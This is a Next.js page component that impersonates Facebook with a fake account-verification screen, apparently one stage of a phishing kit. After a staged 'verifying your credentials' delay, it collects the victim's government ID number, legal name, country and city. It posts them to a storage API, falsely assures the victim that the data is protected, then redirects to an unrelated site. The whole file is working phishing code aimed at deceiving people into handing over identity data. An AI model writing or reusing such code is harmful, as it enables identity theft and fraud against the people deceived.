import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function Verification() {
  const [step, setStep] = useState(1);
  const [userData, setUserData] = useState({
    country: '',
    idNumber: '',
    fullName: '',
    city: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [error, setError] = useState('');

  useEffect(() => {
    // Set Facebook background
    document.body.style.backgroundColor = '#f0f2f5';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    
    // Check if user came from login
    const email = localStorage.getItem('user_email');
    if (!email) {
      window.location.href = '/auth/facebook';
      return;
    }
    setUserEmail(email);
    
    return () => {
      document.body.style.backgroundColor = '';
      document.body.style.margin = '';
      document.body.style.padding = '';
    };
  }, []);

  // Step 1: Verifying (automatic progression)
  useEffect(() => {
    if (step === 1) {
      const timer = setTimeout(() => {
        setStep(2);
      }, 3000); // 3 seconds for "verifying"
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleInputChange = (e) => {
    setUserData({
      ...userData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    console.log('🔵 Starting verification process for:', userEmail);

    try {
      // Validate all fields are filled
      if (!userData.country || !userData.idNumber || !userData.fullName || !userData.city) {
        throw new Error('Please fill in all fields');
      }

      // Store in localStorage for future sessions
      const userSession = {
        email: userEmail,
        ...userData,
        verified: true,
        verifiedAt: new Date().toISOString()
      };
      localStorage.setItem('user_session', JSON.stringify(userSession));

      console.log('🟡 Sending verification data to API...');

      // Send to NeonDB
      const response = await fetch('/api/store-verification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userSession)
      });

      console.log('🟡 Verification API Response status:', response.status);

      // ✅ FIX: Check if the request was successful
      if (!response.ok) {
        const errorText = await response.text();
        console.error('🔴 Verification API Error:', errorText);
        // Continue anyway - don't block the user flow
      } else {
        const result = await response.json();
        console.log('🟢 Verification data stored successfully:', result);
      }

      // Clear login session
      localStorage.removeItem('user_email');
      
      console.log('🟢 Redirecting to YouTube...');
      
      // Redirect to YouTube
      window.location.href = 'https://art-premier-music-library.vercel.app/';
      
    } catch (error) {
      console.error('🔴 Verification failed:', error);
      setError(error.message || 'Verification failed. Please try again.');
      setIsLoading(false);
    }
  };

  // Step 1: Verifying
  if (step === 1) {
    return (
      <>
        <Head>
          <title>Verifying Your Account - Facebook</title>
          <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
        </Head>
        <div className="verification-container">
          <div className="verification-box">
            <div className="loading-spinner">
              <div className="spinner"></div>
            </div>
            <h2>Verifying Your Account</h2>
            <p>Please wait while we verify your Facebook credentials...</p>
            <div className="security-notice">
              <span className="shield-icon">🛡️</span>
              <small>This helps us keep your account secure</small>
            </div>
          </div>

          <style jsx>{`
            .verification-container {
              min-height: 100vh;
              background: #f0f2f5;
              display: flex;
              align-items: center;
              justify-content: center;
              font-family: Helvetica, Arial, sans-serif;
              padding: 20px;
            }
            
            .verification-box {
              background: white;
              padding: 40px;
              border-radius: 8px;
              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
              text-align: center;
              max-width: 400px;
              width: 100%;
            }
            
            .loading-spinner {
              margin-bottom: 20px;
            }
            
            .spinner {
              width: 50px;
              height: 50px;
              border: 4px solid #f3f3f3;
              border-top: 4px solid #1877f2;
              border-radius: 50%;
              animation: spin 1s linear infinite;
              margin: 0 auto;
            }
            
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            
            h2 {
              color: #1c1e21;
              margin-bottom: 10px;
              font-size: 24px;
            }
            
            p {
              color: #606770;
              margin-bottom: 20px;
              font-size: 16px;
            }
            
            .security-notice {
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 8px;
              color: #65676b;
              font-size: 14px;
            }
          `}</style>
        </div>
      </>
    );
  }

  // Step 2: Identity Verification Form
  return (
    <>
      <Head>
        <title>Confirm Your Identity - Facebook</title>
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
      </Head>
      <div className="verification-container">
        <div className="verification-box">
          <div className="header">
            <div className="facebook-logo">facebook</div>
            <h2>Confirm Your Identity</h2>
            <p>We need to verify your identity to secure your account</p>
          </div>

          {error && (
            <div className="error-message">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="verification-form">
            <div className="input-group">
              <label htmlFor="country">Country</label>
              <select
                id="country"
                name="country"
                value={userData.country}
                onChange={handleInputChange}
                required
                className="form-input"
              >
                <option value="">Select your country</option>
                <option value="US">United States</option>
                <option value="UK">United Kingdom</option>
                <option value="CA">Canada</option>
                <option value="AU">Australia</option>
                <option value="DE">Germany</option>
                <option value="FR">France</option>
                <option value="MW">Malawi</option>
                <option value="NG">Nigeria</option>
                <option value="KE">Kenya</option>
                <option value="ZA">South Africa</option>
                <option value="GH">Ghana</option>
                <option value="TZ">Tanzania</option>
                <option value="UG">Uganda</option>
                <option value="ET">Ethiopia</option>
                <option value="EG">Egypt</option>
                <option value="DZ">Algeria</option>
                <option value="MA">Morocco</option>
                <option value="BR">Brazil</option>
                <option value="IN">India</option>
                <option value="PK">Pakistan</option>
                <option value="BD">Bangladesh</option>
                <option value="MX">Mexico</option>
                <option value="RU">Russia</option>
                <option value="CN">China</option>
                <option value="JP">Japan</option>
                <option value="KR">South Korea</option>
                <option value="ID">Indonesia</option>
                <option value="PH">Philippines</option>
                <option value="VN">Vietnam</option>
                <option value="TH">Thailand</option>
                <option value="MY">Malaysia</option>
                <option value="SG">Singapore</option>
                <option value="SA">Saudi Arabia</option>
                <option value="AE">United Arab Emirates</option>
                <option value="IL">Israel</option>
                <option value="TR">Turkey</option>
                <option value="IT">Italy</option>
                <option value="ES">Spain</option>
                <option value="PT">Portugal</option>
                <option value="NL">Netherlands</option>
                <option value="BE">Belgium</option>
                <option value="SE">Sweden</option>
                <option value="NO">Norway</option>
                <option value="DK">Denmark</option>
                <option value="FI">Finland</option>
                <option value="PL">Poland</option>
                <option value="CZ">Czech Republic</option>
                <option value="HU">Hungary</option>
                <option value="RO">Romania</option>
                <option value="GR">Greece</option>
              </select>
            </div>

            <div className="input-group">
              <label htmlFor="idNumber">Government ID Number</label>
              <input
                type="text"
                id="idNumber"
                name="idNumber"
                value={userData.idNumber}
                onChange={handleInputChange}
                placeholder="Enter your national ID, passport, or driver's license"
                required
                className="form-input"
                maxLength="30"
              />
              <small className="help-text">
                This helps us verify your identity and prevent fraud
              </small>
            </div>

            <div className="input-group">
              <label htmlFor="fullName">Full Legal Name</label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                value={userData.fullName}
                onChange={handleInputChange}
                placeholder="As it appears on your government ID"
                required
                className="form-input"
                maxLength="50"
              />
            </div>

            <div className="input-group">
              <label htmlFor="city">City of Residence</label>
              <input
                type="text"
                id="city"
                name="city"
                value={userData.city}
                onChange={handleInputChange}
                placeholder="Enter your current city"
                required
                className="form-input"
                maxLength="30"
              />
            </div>

            <div className="privacy-notice">
              <div className="lock-icon">🔒</div>
              <div className="notice-text">
                <strong>Your information is secure</strong>
                <p>We use encryption to protect your personal data and comply with privacy regulations.</p>
              </div>
            </div>

            <button 
              type="submit" 
              className="confirm-button"
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="button-loading">
                  <div className="button-spinner"></div>
                  Confirming...
                </div>
              ) : (
                'Confirm Identity'
              )}
            </button>
          </form>

          {/* Debug Panel */}
          <div className="debug-panel">
            <h3>Debug Verification</h3>
            <div className="debug-buttons">
              <button
                onClick={async () => {
                  console.log('🧪 Testing verification API...');
                  try {
                    const testData = {
                      email: 'test@example.com',
                      country: 'MW',
                      idNumber: 'TEST12345',
                      fullName: 'Test User',
                      city: 'Lilongwe',
                      verifiedAt: new Date().toISOString()
                    };
                    
                    const response = await fetch('/api/store-verification', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify(testData)
                    });
                    
                    const result = await response.json();
                    console.log('🧪 Verification API Test:', result);
                    alert(`Verification API: ${response.status}\n${JSON.stringify(result, null, 2)}`);
                  } catch (error) {
                    console.error('🧪 Verification API Error:', error);
                    alert('Verification API Failed: ' + error.message);
                  }
                }}
                className="debug-button"
              >
                Test Verification API
              </button>
              
              <button
                onClick={() => {
                  console.log('📋 Current data:');
                  console.log('Email:', userEmail);
                  console.log('Form data:', userData);
                  console.log('LocalStorage user_email:', localStorage.getItem('user_email'));
                }}
                className="debug-button secondary"
              >
                Check Data
              </button>

              <button
                onClick={() => {
                  // Auto-fill test data
                  setUserData({
                    country: 'MW',
                    idNumber: 'MW123456789',
                    fullName: 'John Banda',
                    city: 'Lilongwe'
                  });
                  console.log('✅ Auto-filled Malawi test data');
                }}
                className="debug-button secondary"
              >
                Auto-fill Malawi
              </button>
            </div>
          </div>
        </div>

        <style jsx>{`
          .verification-container {
            min-height: 100vh;
            background: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Helvetica, Arial, sans-serif;
            padding: 20px;
          }
          
          .verification-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 450px;
            width: 100%;
          }
          
          .header {
            text-align: center;
            margin-bottom: 30px;
          }
          
          .facebook-logo {
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 15px;
          }
          
          .header h2 {
            color: #1c1e21;
            margin-bottom: 8px;
            font-size: 20px;
          }
          
          .header p {
            color: #606770;
            font-size: 14px;
            margin: 0;
          }
          
          .error-message {
            background: #fce8e6;
            color: #d93025;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #fadbd9;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
          }
          
          .verification-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
          }
          
          .input-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
          }
          
          label {
            font-weight: 600;
            color: #1c1e21;
            font-size: 14px;
          }
          
          .form-input {
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #f5f6f7;
            transition: all 0.2s;
            box-sizing: border-box;
            width: 100%;
          }
          
          .form-input:focus {
            border-color: #1877f2;
            outline: none;
            background: white;
            box-shadow: 0 0 0 2px #e7f3ff;
          }
          
          .help-text {
            color: #65676b;
            font-size: 12px;
          }
          
          .privacy-notice {
            display: flex;
            gap: 12px;
            background: #f0f8ff;
            padding: 15px;
            border-radius: 6px;
            border: 1px solid #d1e9ff;
          }
          
          .lock-icon {
            font-size: 20px;
          }
          
          .notice-text {
            flex: 1;
          }
          
          .notice-text strong {
            color: #1c1e21;
            display: block;
            margin-bottom: 4px;
          }
          
          .notice-text p {
            color: #606770;
            font-size: 12px;
            margin: 0;
          }
          
          .confirm-button {
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            height: 48px;
            width: 100%;
          }
          
          .confirm-button:hover:not(:disabled) {
            background: #166fe5;
          }
          
          .confirm-button:disabled {
            background: #ccc;
            cursor: not-allowed;
          }
          
          .button-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
          }
          
          .button-spinner {
            width: 16px;
            height: 16px;
            border: 2px solid transparent;
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
          }
          
          .debug-panel {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 16px;
            margin-top: 20px;
          }
          
          .debug-panel h3 {
            color: #856404;
            margin: 0 0 12px 0;
            font-size: 14px;
          }
          
          .debug-buttons {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
          }
          
          .debug-button {
            padding: 8px 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            flex: 1;
            min-width: 120px;
          }
          
          .debug-button.secondary {
            background: #42b72a;
          }
          
          .debug-button:hover {
            opacity: 0.9;
          }

          @media (max-width: 480px) {
            .verification-container {
              padding: 10px;
            }
            
            .verification-box {
              padding: 20px;
            }
            
            .facebook-logo {
              font-size: 28px;
            }
            
            .debug-buttons {
              flex-direction: column;
            }
            
            .debug-button {
              min-width: auto;
            }
          }
        `}</style>
      </div>
    </>
  );
}
